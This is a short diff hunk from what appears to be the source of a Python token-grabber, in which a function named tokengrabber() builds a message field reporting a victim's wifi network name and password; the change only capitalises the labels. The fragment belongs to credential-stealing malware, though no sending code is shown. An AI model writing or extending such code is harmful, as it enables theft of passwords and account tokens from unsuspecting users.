@@ -338,7 +338,7 @@ def tokengrabber():
 					},
                     {
 						"name": "**wifi**",
-						"value":f'network: {getwifinetwork} password: {getwifipassword}',
+						"value":f'NETWORK: {getwifinetwork} PASSWORD: {getwifipassword}',
 						"inline": True
 					},
 					{
